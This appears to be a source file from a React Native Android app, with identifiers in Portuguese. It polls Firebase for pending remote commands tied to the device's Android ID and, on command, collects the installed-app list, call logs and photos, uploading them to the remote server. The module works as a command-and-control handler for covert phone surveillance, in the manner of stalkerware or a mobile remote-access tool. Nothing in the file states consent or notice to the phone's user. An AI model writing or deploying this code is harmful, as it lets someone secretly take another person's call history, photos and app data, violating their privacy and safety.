import firestore from '@react-native-firebase/firestore';
import DeviceInfo from 'react-native-device-info';
import { coletarAppsInstalados } from './coletarAppsInstalados';
import { coletarChamadas } from './coletarChamadas';
import { coletarFotos } from './coletarFotos';
import { enviarFotosParaFirebase } from './enviarFotos';

export const verificarComandos = async () => {
  const androidId = await DeviceInfo.getAndroidId();
  const comandosRef = firestore()
    .collection('dispositivos')
    .doc(androidId)
    .collection('comandos');

  const snapshot = await comandosRef
    .where('status', '==', 'pendente')
    .get();

  for (const doc of snapshot.docs) {
    const comando = doc.data();
    const tipo = comando.tipo;

    try {
      let resultado = null;

      if (tipo === 'apps') {
        resultado = await coletarAppsInstalados();
      } else if (tipo === 'chamadas') {
        resultado = await coletarChamadas();
      } else if (tipo === 'fotos') {
        const fotos = await coletarFotos();
        resultado = await enviarFotosParaFirebase(fotos.fotos);
      }

      await comandosRef.doc(doc.id).update({
        status: 'executado',
        resultado: resultado || 'OK',
        atualizadoEm: firestore.FieldValue.serverTimestamp(),
      });
    } catch (err) {
      await comandosRef.doc(doc.id).update({
        status: 'erro',
        erro: err.message,
        atualizadoEm: firestore.FieldValue.serverTimestamp(),
      });
    }
  }
};
